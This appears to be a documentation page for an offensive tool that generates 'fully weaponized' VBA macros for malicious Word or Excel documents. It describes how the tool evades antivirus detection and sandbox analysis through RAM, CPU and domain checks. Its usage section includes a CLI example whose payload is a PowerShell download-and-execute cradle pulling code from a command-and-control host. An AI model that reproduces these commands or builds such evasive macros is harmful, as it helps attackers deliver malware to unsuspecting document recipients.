# VBA Macro Generation

## 1. Concept: What is it?
Visual Basic for Applications (VBA) macros are scripts embedded inside Microsoft Office documents. When a user opens the document and clicks "Enable Content," the macro executes payload code. 

Because macros have full access to the underlying Windows API, malicious macros can launch child processes, write files, manipulate memory, or download secondary stages via `WinHttp`. 

## 2. Implementation: How does it work?
In `macro_engine.py`, the `MacroEngine` dynamically generates fully weaponized VBA code blocks based on user-supplied options.

To bypass basic AV flags, the macro avoids obvious syntax like `WScript.Shell.Run` or `Shell()`. Instead, it uses `CreateObject("WScript.Shell")` and integrates the Sandbox Evasion logic (RAM, CPU, and Domain checks) directly into the VBA `Sub AutoOpen()` flow.

1. It injects VBA API declarations (`Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)`) to support native execution delays.
2. It queries WMI (`winmgmts:\\.\root\cimv2`) for environmental checks.
3. If the environment passes the checks, it executes the payload via standard COM mechanics.
4. The output is a `.vba` text file intended to be dropped into a malicious Word or Excel document.

## 3. Usage
**CLI Command:**
```bash
# Generate a standard execution macro
python3 hider.py vba --payload "powershell -c Start-Process calc.exe" --out macro.vba

# Generate an evasive macro requiring a domain-joined PC and 4GB RAM
python3 hider.py vba --payload "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://c2/b')" \
    --check-domain --min-ram 4 --out stealth.vbs
```
